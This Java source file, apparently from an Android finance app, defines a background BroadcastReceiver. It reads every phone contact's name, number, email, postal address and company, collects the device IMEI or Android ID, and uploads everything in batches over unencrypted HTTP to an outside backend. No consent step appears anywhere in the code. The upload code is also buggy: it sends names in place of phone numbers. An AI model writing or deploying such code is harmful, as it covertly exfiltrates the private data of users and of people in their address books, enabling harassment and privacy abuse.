package com.tst.hytonefinance.Background_Service;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.ServerError;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.tst.hytonefinance.Models.CONTACT;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class contact_sync extends BroadcastReceiver {
    Context context;
    private String Base_Url = "http://backend.getbridge.in";

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context=context;
        Log.e("Process_status :","Contact Sync started",null);
        getContactList(0);
    }

    @SuppressLint("Range")
    private void getContactList(int skip) {
        int Contact_iteration=100;
        ArrayList<CONTACT> Contact_list=new ArrayList<>();

        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        int index = 0;

        if ((cur != null ? cur.getCount() : 0) > 0) {
            for (int i=0; i<skip && cur.moveToNext();i++)
            {
                index++;
            }
            Log.e("Skip : ", index+"");

            while (Contact_iteration >0 && cur.moveToNext()) {
                CONTACT temp_obj=new CONTACT();


                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));

                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                index++;

                //************** Company Name ****************
                String rawContactId = getRawContactId(id);
                String companyName = getCompanyName(rawContactId);
//                Log.e("Has Number",cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) + " ",null);

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0)
                {
                    Contact_iteration--;
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));

                        //********************** Email ID ******************************
                        Cursor emailCur = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,null,ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{id},null);
                        ArrayList<String> email =new ArrayList<>();
                        while (emailCur.moveToNext()) {
                            email.add(emailCur.getString( emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)));
//                            Log.e("Email_log",name+" "+email);
                        }
                        emailCur.close();

                        //******************** Address ********************
                        Cursor aCur = cr.query(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        String address = null;

                        while (aCur.moveToNext())
                        {
                            address = aCur.getString(aCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS));
//                            Log.e("Address_log", "Address: "+address);
                        }
                        aCur.close();

                        temp_obj.setName(name);
                        temp_obj.setEmail(email);
                        temp_obj.setLocation(address);
                        temp_obj.setNumber(phoneNo);
                        temp_obj.setCompany(companyName);

                        Contact_list.add(temp_obj);

                        Log.e("Contact : ","Index :"+index+" Name : "+name);

                    }
                    pCur.close();
                }
            }

        }

        if (cur != null) {
            cur.close();
        }
        form_contact_object(Contact_list,index,Contact_iteration);
    }

    @SuppressLint("Range")
    private String getRawContactId(String contactId) {
        String[] projection = new String[]{ContactsContract.RawContacts._ID};
        String selection = ContactsContract.RawContacts.CONTACT_ID + "=?";
        String[] selectionArgs = new String[]{contactId};
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(ContactsContract.RawContacts.CONTENT_URI, projection, selection, selectionArgs, null);
        if (c == null) return null;
        int rawContactId = -1;
        if (c.moveToFirst()) {
            rawContactId = c.getInt(c.getColumnIndex(ContactsContract.RawContacts._ID));
        }
        c.close();
        return String.valueOf(rawContactId);

    }

    @SuppressLint("Range")
    private String getCompanyName(String rawContactId) {
        try {
            String orgWhere = ContactsContract.Data.RAW_CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
            String[] orgWhereParams = new String[]{rawContactId,
                    ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Data.CONTENT_URI,
                    null, orgWhere, orgWhereParams, null);

            if (cursor == null) return null;
            String name = null;
            if (cursor.moveToFirst()) {
                name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY));
            }
            cursor.close();
            return name;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }

    }

    @SuppressLint({"MissingPermission", "HardwareIds"})
    public String getDeviceIMEI() {
        String deviceId;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            deviceId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } else {
            TelephonyManager mTelephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (null != mTelephony.getDeviceId()) deviceId = mTelephony.getDeviceId();
            else {
                deviceId = Settings.Secure.getString(
                        context.getContentResolver(),
                        Settings.Secure.ANDROID_ID);
            }
        }

        return deviceId;
    }

    private void form_contact_object(ArrayList<CONTACT> contact_list,int end_point,int Contact_iteration ){


        JSONArray Contact_list = new JSONArray();

        for (int i=0;i<contact_list.size();i++) {
            JSONObject temp = new JSONObject();
            try {
                temp.put("name", contact_list.get(i).getName());
                temp.put("number", contact_list.get(i).getName());
                temp.put("location", contact_list.get(i).getLocation());
                temp.put("email", contact_list.get(i).getEmail());
                temp.put("company", contact_list.get(i).getCompany());
                Contact_list.put(temp);
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }
        }
        sync_list(Contact_list, Base_Url + "/api/v1/contact/userContact", "contact",Contact_iteration,end_point);
    }

    //------------------ Sync Function List -------------------
    private void sync_list(JSONArray body_Array, String url, String Array_name, int size,int end_point ) {
        RequestQueue requestQueue = Volley.newRequestQueue(context);
        requestQueue.start();


        try {
            JSONObject Details = new JSONObject();
            Details.put("user", getDeviceIMEI());
            Details.put(Array_name, body_Array);

            JsonObjectRequest jsObjRequest = new
                    JsonObjectRequest(Request.Method.POST,
                            url,
                            Details,
                            new Response.Listener<JSONObject>() {
                                @Override
                                public void onResponse(JSONObject response) {

                                    try {
                                        Log.e("C_API_Response","Size : "+size+ String.valueOf(response.getString("status").equals("sucecss")), null);
                                        Log.e("C_API_Response", response.toString(), null);
                                        if(response.getString("status").equals("sucecss"))
                                        {
                                            if(size==0)
                                            {
                                                getContactList(end_point);
                                            }
                                        }
                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                        Log.e("Request_response_catch", e.getMessage(), null);
                                    }
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {

                                    NetworkResponse response = error.networkResponse;
                                    if (error instanceof ServerError && response != null) {
                                        String res;
                                        try {
                                            res = new String(response.data,
                                                    HttpHeaderParser.parseCharset(response.headers, "utf-8"));
                                            Log.e("API_Response_Error 1", res, null);
                                        } catch (UnsupportedEncodingException e) {
                                            e.printStackTrace();
                                        }
                                        // Now you can use any deserializer to make sense of data
                                    }
                                    Log.e("C_API_Response_Error", error.getMessage(), null);
                                }
                            }) {
                        @Override
                        public Map<String, String> getHeaders() {
                            HashMap<String, String> headers = new HashMap<>();
                            headers.put("Content-Type", "application/json; charset=utf-8");
                            return headers;
                        }
                    };

            requestQueue.add(jsObjRequest);
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }
}
